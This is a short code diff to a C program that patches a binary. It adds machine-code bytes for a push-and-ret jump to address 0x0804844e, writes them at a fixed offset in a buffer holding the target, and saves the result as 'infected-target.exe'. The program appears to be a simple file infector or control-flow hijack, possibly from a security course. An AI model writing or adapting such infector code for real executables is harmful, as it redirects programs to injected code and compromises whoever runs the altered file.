@@ -27,6 +27,13 @@ int main() {
         buffer[1128 + i] = str[i];
     }
 
+    // tricky jump
+    char * jump = "\x68\x4e\x84\x04\x08" // push 0x0804844e
+                  "\xc3"; // ret
+    for (int i = 0; i < 5; i++) {
+        buffer[1171 + i] = jump[i];
+    }
+
     // read infect to edit
     FILE * infect = fopen("infected-target.exe", "wb");
     fwrite(buffer, sizeof(char), 7328, infect);
